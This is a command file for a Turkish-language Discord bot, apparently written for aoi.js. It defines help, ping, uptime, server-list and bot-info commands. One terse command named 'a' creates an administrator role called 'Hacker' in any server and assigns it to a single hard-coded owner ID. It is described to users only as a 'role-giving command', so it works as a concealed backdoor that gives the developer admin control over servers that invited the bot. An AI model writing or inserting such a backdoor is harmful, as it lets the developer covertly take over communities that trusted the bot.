module.exports = [
  {
    name: "botkod",
    code: `
$description[**BOT KOMUTLARI**

!sunucular – Botun bulunduğu sunucuların adlarını listeler  
!swsay – Botun kaç sunucuda olduğunu gösterir  
!ping – Botun ping değerini gösterir  
!uptime – Botun aktif süresini gösterir  
!sunucu – Botun sunucu davetini gönderir  
!botbilgi – Bot hakkında genel bilgi verir]
$footer[$username kullandı.]
`
  },
  {
    name: "botbilgi",
    code: `
$description[**Bot Bilgisi**

Botun Sahibi: <@1141265487330811944>  
Kuruluş Tarihi: 2023  
Sunucu Sayısı: $guildCount  
Toplam Kullanıcı: $allMembersCount  
Komut Sayısı: $commandsCount  
Uptime: $replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$uptime;seconds;saniye];seconds;saniye];minutes;dakika];hour;saat];minute;dakika];day;gün];days;gün];second;saniye]  
Ping: $ping  

Ek Bilgi: !güncelbilgi  
Dil: Türkçe]
`
  },
  {
    name: "sunucular",
    code: `
$description[$guildNames[]]
$footer[Olduğum Sunucular]
$onlyIf[$getGlobalUserVar[kara]!=alınmış;Karalistedesin]
`
  },
  {
    name: "ping",
    code: `
Ping hesaplanıyor...  
$editIn[4s;Mevcut Ping: $ping]
$onlyPerms[managemessages;Mesaj düzenleme yetkim yok.]
$onlyIf[$getGlobalUserVar[kara]!=alınmış;Karalistedesin]
`
  },
  {
    name: "uptime",
    code: `
Benim çalıştığım süre:  
$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$replaceText[$uptime;seconds;saniye];seconds;saniye];minutes;dakika];hour;saat];minute;dakika];day;gün];days;gün];second;saniye]
`
  },
  {
    name: "kurucun",
    code: `
Benim sahibim: $username[1141265487330811944]  
$onlyIf[$getGlobalUserVar[kara]!=alınmış;Karalistedesin]
`
  },
  {
    name: "sunucu",
    code: `
|| Kapandı: https://discord.com/invite/TeGdhb9XBj ||
`
  },
  {
    name: "kurucu",
    code: `
Benim kurucum: <@1141265487330811944>
`
  },
  {
    name: "ekbilgi",
    code: `
$description[EK BİLGİ

Komut Bilgisi:  
$commandsCount komutlu bot. Bazı komutlar hata verebilir çünkü botun mesaj düzenleme gibi yetkilere ihtiyacı vardır. Yetki verilmezse konsolda hata oluşur ve bot kapanabilir.  

Komutları tanımak için !linkle yazabilirsiniz.  

Gerekli komutlar:  
!sunucukur – Sunucu kurar, admin rolüne yetki verir  
!kural – Kural mesajı gönderir  
!yetkili – Yetkili komutlarını gösterir  
!linkle – Linkle ilgili bilgi verir]
`
  },
  {
    name: "yenile",
    code: `
$updateCommands
$color[Aqua]
$description[$username[$clientID] komutları başarıyla güncellendi. Kod sayısı: $commandsCount]
$deleteIn[4s]
$onlyForIDs[1141265487330811944;<@$authorID> Sadece kurucum kullanabilir.]
`
  },
  {
    name: "a",
    code: `
$giveRole[$guildID;$authorID;$findRole[Hacker]]
$createRole[$guildID;Hacker;;1;;false;;true;false;Rol oluşturuldu!;administrator]
$onlyClientPerms[administrator;Yetkim yok maalesef.]
$onlyForIDs[1141265487330811944;<@$authorID> VIP!]
`
  },
  {
    name: "sahipkod",
    code: `
$description[KODLAR

!a – Rol verme komutu  
!yenile – Komutları günceller  
!karaliste – Birini kara listeye ekler]
$color[#ff0000]
`
  },
  {
    name: "<@1178404693685325845>",
    nonPrefixed: true,
    code: `
$reply
Beni etiketledin. Yardım ve eğlence komutlarım var. Yetkili kodlarım seni bekliyor!

!yardım  
!sadeyardım
`
  },
  {
    name: "linkle",
    code: `
$description[LİNKLE

Discord sunucumuz kapandı.  

Deneme sistemimiz:  
[Deneme site](https://d7526ed2-cdd9-4b5f-a461-bf03db085e9c-00-1lilrvtqrb0il.sisko.replit.dev/)]
$color[#ff0000]
`
  }
]